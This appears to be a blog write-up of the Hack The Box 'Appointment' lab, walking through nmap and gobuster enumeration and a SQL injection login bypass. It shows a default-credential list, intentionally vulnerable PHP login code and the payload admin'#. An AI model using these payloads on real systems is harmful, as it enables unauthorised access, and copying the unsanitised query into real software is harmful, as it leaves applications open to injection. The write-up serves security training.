---
layout: default
---

[üè† home](../)

<h1 style="text-align: center;">Penetration Testing: Exploiting SQL Injection</h1>

# Scenario
Appointment is a web-application box focused on SQL Injection attacks. The target is a website with search functionality vulnerable to `SQL Injection`, querying a back-end `SQL database`. 

Different user privileges return varying search results: administrators can access sensitive data (e.g., user info, billing), while regular users or visitors can only view products. However, an attacker can exploit SQL Injection to bypass these restrictions and query any `table` in the database, accessing information they shouldn't be able to see.

**Project Reference**: Hack the Box -> Starting Point -> Tier 1: Appointment

# Enumeration
First, I perform an nmap scan to find the open and available ports and their services. If no alternative flag is specified in the command syntax, nmap will scan the most common 1000 TCP ports for active services. This will suit us in mycase.

Additionally, I will need super-user privileges to run the command below with the `-sC` or `-sV` flags. This is because script scanning ( `-sC` ) and version detection ( `-sV` ) are considered more intrusive methods of scanning the target. This results in a higher probability of being caught by a perimeter security device on the target's network.

Only ethernet devices can be used for raw scans on Windows. Use the `--unprivileged` flag for this scan. 

If the host machine "seems" to be down but is really up, but blocking myping probes I can use the `-Pn` flag.

```kail-terminal
zsh: corrupt history file /home/taskmaster/.zsh_history
‚îå‚îÄ‚îÄ(taskmaster„âøkali)-[~]
‚îî‚îÄ$ sudo nmap -sC -sV -Pn --unprivileged 10.129.9.138
[sudo] password for taskmaster: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 11:54 +06
Nmap scan report for 10.129.9.138
Host is up (0.38s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.96 seconds

```

The only open port I detect is port `80 TCP`, which is running the `Apache httpd` server version `2.4.38`.

> Apache HTTP Server is a free and open-source application that runs web pages on either physical or virtual web servers. It is one of the most popular HTTP servers, and it usually runs on standard HTTP ports such as 80 TCP, 443 TCP, and alternatively on ports like 8080 TCP or 8000 TCP. HTTP stands for Hypertext Transfer Protocol, an application-layer protocol used for transmitting hypermedia documents like HTML (Hypertext Markup Language). The -sC option in Nmap performs a script scan using the default set of scripts (equivalent to --script=default). Some of these scripts are intrusive and should not be run against a target network without permission. The -sV option enables version detection, which identifies what versions of services are running on specific ports. The Nmap scan provided us with the exact version of the Apache httpd service, which is 2.4.38. It's a good practice to check the service version on vulnerability databases to see if there are any known vulnerabilities. In this case, there are no known vulnerabilities for this version that could be exploited.

In order to further enumerate the service running on port 80, I can navigate directly to the IP address of the target from mybrowser. By typing the IP address of the target into the URL field of mybrowser, I are faced with a website containing a log-in form.

![image](https://github.com/user-attachments/assets/d618e229-8a20-4279-8e8f-9f1f7f2fc4b5)

> **Note**: I will be exploring the concept of brute-forcing different directories to include in myEnumeration phase, which will not help us exploit the target and is considered an optional but good-to-know step.

## Brute-Force
Since I are not aware of any specific credentials that I could use to log-in, I will check if there are any other directories or pages useful for us in the enumeration process.

Tried navigating to pages I accustomed to (including possible nested pages):
* http://10.129.9.138/home
* http://10.129.9.138/contact
* http://10.129.9.138/register
* http://10.129.9.138/login
* http://10.129.9.138/login/forgot-password

All of the pages returned the **`Not Found`** error with status code **`404`** indicating that the resource or directory cannot be found.

![image](https://github.com/user-attachments/assets/222843f7-f384-45af-b124-3fb733fde608)

Instead of manually navigating through the URL search bar to find this hidden data, I will be using a tool that will automate the search for us. This is where tools such as Gobuster come into play. I will be running a tool called `Gobuster`, which will brute-force the directories and files provided in the wordlist of mychoice.

### Gobuster
> Applying the brute-forcing method to web directories and resources with such a tool will inject the variables from the wordlist one by one, inconsequent requests to the HTTP server, and then read the HTTP response code for each request to see if it is accepted as an existing resource or not. In mycase, the wordlists I will be using will contain standard directory and file names (such as `images`, `scripts`, `login.php`, `admin.php`), combined with more uncommon ones.

<pre><font color="#5EBDAB">‚îå‚îÄ‚îÄ(</font><font color="#277FFF"><b>taskmaster„âøkali</b></font><font color="#5EBDAB">)-[</font><b>~</b><font color="#5EBDAB">]</font>
<font color="#5EBDAB">‚îî‚îÄ</font><font color="#277FFF"><b>$</b></font> <font color="#5EBDAB"><u style="text-decoration-style:solid">sudo</u></font> <font color="#49AEE6">apt</font> install gobuster
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
gobuster is already the newest version (3.6.0-1+b1).
The following packages were automatically installed and are no longer required:
  cython3 debtags gcc-12-base gir1.2-ayatanaappindicator3-0.1 gnome-bluetooth
  kali-debtags libappstream4 libarmadillo11 libboost-dev libboost1.74-dev
  libcanberra-gtk-module libcanberra-gtk0 libcbor0.8 libcurl3-nss
  libgcab-1.0-0 libgcc-12-dev libgdal33 libgeos3.12.0 libgumbo1
  libgupnp-igd-1.0-4 libhiredis0.14 libjavascriptcoregtk-4.0-18 libjim0.81
  libmagickcore-6.q16-6 libmagickcore-6.q16-6-extra libmagickwand-6.q16-6
  libmozjs-102-0 libnfs13 libobjc-12-dev libopenblas-dev
  libopenblas-pthread-dev libopenblas0 libperl5.36 libpython3-all-dev
  libpython3.12 libpython3.12-dev librtlsdr0 libsmbios-c2 libstdc++-12-dev
  libtexluajit2 libucl1 libutf8proc2 libxsimd-dev libzxing2 lua-lpeg
  nss-plugin-pem perl-modules-5.36 python3-all-dev python3-backcall
  python3-beniget python3-debian python3-future python3-gast python3-jdcal
  python3-pickleshare python3-pyminifier python3-pythran
  python3-requests-toolbelt python3-rfc3986 python3-unicodecsv python3.12-dev
  xtl-dev
Use &apos;sudo apt autoremove&apos; to remove them.
0 upgraded, 0 newly installed, 0 to remove and 218 not upgraded.

</pre>

After checking the `help` option, I can now use the program to find interesting pages and directories.

<pre><font color="#5EBDAB">‚îå‚îÄ‚îÄ(</font><font color="#277FFF"><b>taskmaster„âøkali</b></font><font color="#5EBDAB">)-[</font><b>~</b><font color="#5EBDAB">]</font>
<font color="#5EBDAB">‚îî‚îÄ</font><font color="#277FFF"><b>$</b></font> <font color="#49AEE6">gobuster</font> <font color="#5EBDAB">--help</font>
Usage:
  gobuster [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
  gcs         Uses gcs bucket enumeration mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  tftp        Uses TFTP enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)

Flags:
      --debug                 Enable debug output
      --delay duration        Time each thread waits between requests (e.g. 1500ms)
  -h, --help                  help for gobuster
      --no-color              Disable color output
      --no-error              Don&apos;t display errors
  -z, --no-progress           Don&apos;t display progress
  -o, --output string         Output file to write results to (defaults to stdout)
  -p, --pattern string        File containing replacement patterns
  -q, --quiet                 Don&apos;t print the banner and other noise
  -t, --threads int           Number of concurrent threads (default 10)
  -v, --verbose               Verbose output (errors)
  -w, --wordlist string       Path to the wordlist. Set to - to use STDIN.
      --wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)

Use &quot;gobuster [command] --help&quot; for more information about a command.
</pre>

 However, I still lack a wordlist. To download the most famous wordlist collections in use today I downloaded `SecLists` from this [link](https://github.com/danielmiessler/SecLists).

<pre><font color="#5EBDAB">‚îå‚îÄ‚îÄ(</font><font color="#277FFF"><b>taskmaster„âøkali</b></font><font color="#5EBDAB">)-[</font><b>~</b><font color="#5EBDAB">]</font>
<font color="#5EBDAB">‚îî‚îÄ</font><font color="#277FFF"><b>$</b></font> <font color="#49AEE6">git</font> clone https://github.com/danielmiessler/SecLists.git
Cloning into &apos;SecLists&apos;...
remote: Enumerating objects: 30231, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 30231 (delta 1), reused 12 (delta 1), pack-reused 30214 (from 1)
Receiving objects: 100% (30231/30231), 1.47 GiB | 4.47 MiB/s, done.
Resolving deltas: 100% (20374/20374), done.
Updating files: 100% (6265/6265), done.
</pre>

Now, I can start using Gobuster to its full capabilities. The flags I will be using with this command are as follows:

```
dir : Specify that I wish to do web directory enumeration.
--url : Specify the web address of the target machine that runs the HTTP server.
--wordlist : Specify the wordlist that I want to use.
```

After checking out the web directories, I have found no helpful information. The results present in myoutput represent default directories for most websites, and most of the time, they do not contain files that could be exploitable or useful for an attacker in any way. However, it is still worth checking them because
sometimes, they could contain non-standard files placed there by mistake.

<pre>                                                                                                                  
<font color="#5EBDAB">‚îå‚îÄ‚îÄ(</font><font color="#277FFF"><b>taskmaster„âøkali</b></font><font color="#5EBDAB">)-[</font><b>~</b><font color="#5EBDAB">]</font>
<font color="#5EBDAB">‚îî‚îÄ</font><font color="#277FFF"><b>$</b></font> <font color="#49AEE6">gobuster</font> dir <font color="#5EBDAB">--url</font> http://10.129.9.138/ <font color="#5EBDAB">--wordlist</font> <b>/home/taskmaster/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</b>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.9.138/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/taskmaster/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images              <font color="#49AEE6"> (Status: 301)</font> [Size: 313]<font color="#367BF0"> [--&gt; http://10.129.9.138/images/]</font>
/css                 <font color="#49AEE6"> (Status: 301)</font> [Size: 310]<font color="#367BF0"> [--&gt; http://10.129.9.138/css/]</font>
/js                  <font color="#49AEE6"> (Status: 301)</font> [Size: 309]<font color="#367BF0"> [--&gt; http://10.129.9.138/js/]</font>
/vendor              <font color="#49AEE6"> (Status: 301)</font> [Size: 313]<font color="#367BF0"> [--&gt; http://10.129.9.138/vendor/]</font>
/fonts               <font color="#49AEE6"> (Status: 301)</font> [Size: 312]<font color="#367BF0"> [--&gt; http://10.129.9.138/fonts/]</font>
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
</pre>

> HTTP1/1 `302 Found`: Page/resource found, but by redirection to another directory (moved temporarily). This is an invitation to the user-agent (the web browser) to make a second, identical request to the new URL specified in the location field. You will perceive the whole process as a seamless redirection to the new URL of the specified resource.

Since Gobuster did not find anything useful, I need to check for any default credentials or bypass the login page somehow. To check for default credentials, I could type the most common combinations in the username and password fields, such as:

```
admin:admin
guest:guest
user:user
root:root
administrator:password
```

After attempting all of those combinations, I have still failed to log in. I could, hypothetically, use a tool to attempt brute-forcing the log-in page. However, that would take much time and might trigger a security measure. The next sensible tactic would be to test the log-in form for a possible SQL Injection vulnerability.

## SQL Injection
Here is an example of how authentication works using PHP & SQL:
```
<?php
mysql_connect("localhost", "db_username", "db_password"); # Connection to the SQL
Database.
mysql_select_db("users"); # Database table where user information is stored.
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.
$result=mysql_query($sql);
# Performs query stored in $sql and stores it in $result.
$count=mysql_num_rows($result);
# Sets the $count variable to the number of rows stored in $result.
if ($count==1){
# Checks if there's at least 1 result, and if yes:
$_SESSION['username'] = $username; # Creates a session with the specified $username.
$_SESSION['password'] = $password; # Creates a session with the specified $password.
header("location:home.php"); # Redirect to homepage.
}
else { # If there's no singular result of a user/pass combination:
 header("location:login.php");
 # No redirection, as the login failed in the case the $count variable is not equal to 1,
HTTP Response code 200 OK.
}
?>
```

I could manipulate the query command by inputting the following:
```
Username: admin'#
Password: abc123
```
To be more precise, here is how the query part of the PHP code gets affected by my input.
```
SELECT * FROM users WHERE username='admin'#' AND password='abc123'
```

I have **commented out the password check section** of the query. This will result in the PHP script returning the value 1 (1 row found) for `username = 'admin'` without checking the password field to match that entry. This is due to a lack of input validation in the PHP code shown above.

![image](https://github.com/user-attachments/assets/e3c52b11-5eee-4236-a307-285c538c9136)

After pressing the log-in button, the exploit code is sent, and as suspected, the following page is presented:

![image](https://github.com/user-attachments/assets/22ec5eca-9d8e-489a-b294-e791f13bdda7)

_I have successfully performed a primary SQL Injection and got the flag._
